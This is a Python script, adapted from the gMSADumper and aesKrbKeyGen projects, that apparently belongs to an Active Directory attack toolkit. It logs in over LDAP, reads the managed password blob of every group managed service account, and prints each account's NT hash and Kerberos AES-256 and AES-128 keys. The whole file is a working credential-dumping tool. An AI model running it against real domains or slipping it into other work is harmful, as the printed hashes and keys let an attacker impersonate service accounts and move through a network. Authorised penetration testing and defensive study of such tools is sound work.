#!/usr/bin/env python3
# From:
# https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py
# https://github.com/Tw1sm/aesKrbKeyGen/blob/master/aesKrbKeyGen.py
#
# cleanup + arguments uniformization

import argparse
import binascii
import hashlib
from Crypto.Cipher import AES
from Crypto.Protocol import KDF
from impacket.structure import Structure
from ldap3 import SUBTREE

from ldap_auth import ldap_auth, add_common_parameters
from attr import funcattr, attr_common_parameters


# Constants
AES256_CONSTANT = [0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4]
AES128_CONSTANT = AES256_CONSTANT[:16]
IV = [0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
ITERATION = 4096 # Active Directory default


def do_aes_256(aes_256_pbkdf2):
    cipher = AES.new(aes_256_pbkdf2, AES.MODE_CBC, bytes(IV))
    key_1 = cipher.encrypt(bytes(AES256_CONSTANT))
    cipher = AES.new(aes_256_pbkdf2, AES.MODE_CBC, bytes(IV))
    key_2 = cipher.encrypt(bytearray(key_1))
    aes_256_raw = key_1[:16] + key_2[:16]
    return aes_256_raw.hex()


def do_aes_128(aes_128_pbkdf2):
    cipher = AES.new(aes_128_pbkdf2, AES.MODE_CBC, bytes(IV))
    aes_128_raw = cipher.encrypt(bytes(AES128_CONSTANT))
    return aes_128_raw.hex()


class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    add_common_parameters(parser)
    args = parser.parse_args()

    serv, conn = ldap_auth(args)

    conn.search(
        search_base=serv.info.other['defaultNamingContext'][0],
        search_filter=f'(&(objectClass=msDS-GroupManagedServiceAccount))',
        search_scope=SUBTREE,
        attributes = ['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])

    fqdn = args.connection.split('/')[0].upper()

    for entry in conn.entries:
        data = entry['msDS-ManagedPassword'].raw_values[0]
        blob = MSDS_MANAGEDPASSWORD_BLOB()
        blob.fromString(data)

        passwd = blob['CurrentPassword'][:-2]
        user = entry['sAMAccountName'].raw_values[0].decode()

        nthash = binascii.hexlify(hashlib.new("md4", passwd).digest()).decode()
        salt = f'{fqdn}host{user.replace("$", "").lower()}.{fqdn.lower()}'.encode('utf-8')
        password_bytes = passwd.decode('utf-16-le', 'replace').encode('utf-8')
        aes_256_pbkdf2 = KDF.PBKDF2(password_bytes, salt, 32, ITERATION)
        aes_128_pbkdf2 = aes_256_pbkdf2[:16]
        aes_256_key = do_aes_256(aes_256_pbkdf2)
        aes_128_key = do_aes_128(aes_128_pbkdf2)

        print(f'{user}:nt: {nthash}')
        print(f'{user}:aes256-cts-hmac-sha1-96: {aes_256_key}')
        print(f'{user}:aes128-cts-hmac-sha1-96: {aes_128_key}')
